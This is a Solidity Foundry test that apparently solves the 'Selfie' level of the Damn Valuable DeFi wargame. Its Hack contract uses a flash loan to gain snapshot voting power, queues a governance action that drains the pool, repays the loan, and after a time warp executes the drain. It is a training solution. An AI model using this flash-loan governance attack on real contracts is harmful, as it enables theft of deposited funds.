// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {DamnValuableTokenSnapshot} from "../../../src/Contracts/DamnValuableTokenSnapshot.sol";
import {SimpleGovernance} from "../../../src/Contracts/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../../src/Contracts/selfie/SelfiePool.sol";

///////////////////////
// Hack contract
///////////////////////

contract Hack {
    SelfiePool public selfiePool;
    SimpleGovernance public simpleGovernance;
    DamnValuableTokenSnapshot public dvt;
    uint256 actionId;

    constructor(address _pool, address _governance, address _token) {
        selfiePool = SelfiePool(_pool);
        simpleGovernance = SimpleGovernance(_governance);
        dvt = DamnValuableTokenSnapshot(_token);
    }

    fallback() external payable {
        dvt.snapshot();
        bytes memory data = abi.encodeWithSelector(SelfiePool.drainAllFunds.selector, address(this));
        actionId = simpleGovernance.queueAction(address(selfiePool), data, 0);

        dvt.transfer(address(selfiePool), dvt.balanceOf(address(this)));
    }

    function attack() external {
        //uint256 amount = dvt.balanceOf(address(selfiePool));
        selfiePool.flashLoan(dvt.balanceOf(address(selfiePool)));
    }

    function drain() external {
        simpleGovernance.executeAction(actionId);
        dvt.transfer(msg.sender, dvt.balanceOf(address(this)));
    }

}

//////////////////////
// Tests
//////////////////////

contract Selfie is Test {
    uint256 internal constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 internal constant TOKENS_IN_POOL = 1_500_000e18;

    Utilities internal utils;
    SimpleGovernance internal simpleGovernance;
    SelfiePool internal selfiePool;
    DamnValuableTokenSnapshot internal dvtSnapshot;
    address payable internal attacker;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];

        vm.label(attacker, "Attacker");

        dvtSnapshot = new DamnValuableTokenSnapshot(TOKEN_INITIAL_SUPPLY);
        vm.label(address(dvtSnapshot), "DVT");

        simpleGovernance = new SimpleGovernance(address(dvtSnapshot));
        vm.label(address(simpleGovernance), "Simple Governance");

        selfiePool = new SelfiePool(
            address(dvtSnapshot),
            address(simpleGovernance)
        );

        dvtSnapshot.transfer(address(selfiePool), TOKENS_IN_POOL);

        assertEq(dvtSnapshot.balanceOf(address(selfiePool)), TOKENS_IN_POOL);

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */
        vm.startBroadcast(attacker);
        Hack hack = new Hack(address(selfiePool), address(simpleGovernance), address(dvtSnapshot));
        hack.attack();

        vm.warp(block.timestamp + 2 days); 

        hack.drain();

        vm.stopBroadcast();

        /**
         * EXPLOIT END *
         */
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        // Attacker has taken all tokens from the pool
        assertEq(dvtSnapshot.balanceOf(attacker), TOKENS_IN_POOL);
        assertEq(dvtSnapshot.balanceOf(address(selfiePool)), 0);
    }
}
